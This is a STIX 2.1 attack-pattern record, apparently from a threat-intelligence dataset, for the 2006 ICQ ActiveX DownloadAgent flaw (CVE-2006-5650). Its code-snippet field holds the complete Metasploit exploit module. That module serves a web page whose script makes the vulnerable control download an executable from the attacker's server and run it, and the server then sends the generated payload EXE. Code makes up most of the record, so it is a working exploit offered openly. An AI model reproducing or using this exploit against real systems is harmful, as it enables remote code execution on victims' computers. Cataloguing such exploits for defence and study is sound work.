{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c4a158a9-371d-4c3c-979e-fbd493b0a059",
    "created": "2024-08-14T16:44:11.144476Z",
    "modified": "2024-08-14T16:44:11.14448Z",
    "name": "America Online ICQ ActiveX Control Arbitrary File Download and Execute",
    "description": " This module allows remote attackers to download and execute arbitrary files on a users system via the DownloadAgent function of the ICQPhone.SipxPhoneManager ActiveX control.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/aol_icq_downloadagent.rb",
            "external_id": "aol_icq_downloadagent.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-5650"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'America Online ICQ ActiveX Control Arbitrary File Download and Execute',\n      'Description'    => %q{\n          This module allows remote attackers to download and execute arbitrary files\n        on a users system via the DownloadAgent function of the ICQPhone.SipxPhoneManager ActiveX control.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2006-5650' ],\n          [ 'OSVDB', '30220' ],\n          [ 'BID', '20930'  ],\n          [ 'ZDI', '06-037' ],\n        ],\n      'Payload'        =>\n        {\n          'Space'           => 2048,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'DisclosureDate' => '2006-11-06',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('URIPATH', [ true, \"The URI to use.\", \"/\" ])\n      ])\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n\n    payload_url =  \"http://\"\n    payload_url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    payload_url += \":\" + datastore['SRVPORT'].to_s + get_resource() + \"/PAYLOAD\"\n\n    if (request.uri.match(/PAYLOAD/))\n      return if ((p = regenerate_payload(cli)) == nil)\n      data = generate_payload_exe({ :code => p.encoded })\n      print_status(\"Sending EXE payload\")\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    vname  = rand_text_alpha(rand(100) + 1)\n    exe    = rand_text_alpha_upper(rand(5) + 1)\n\n    content = %Q|\n  <html>\n    <head>\n      <script>\n        try {\n          var #{vname} = new ActiveXObject('ICQPhone.SipxPhoneManager.1');\n          #{vname}.DownloadAgent(\"#{payload_url}/#{exe}.exe\");\n        } catch( e ) { window.location = 'about:blank' ; }\n      </script>\n    </head>\n  </html>\n        |\n\n    print_status(\"Sending exploit...\")\n\n    send_response_html(cli, content)\n\n    handler(cli)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-11-06",
    "x_mitre_platforms": [
        "win'"
    ]
}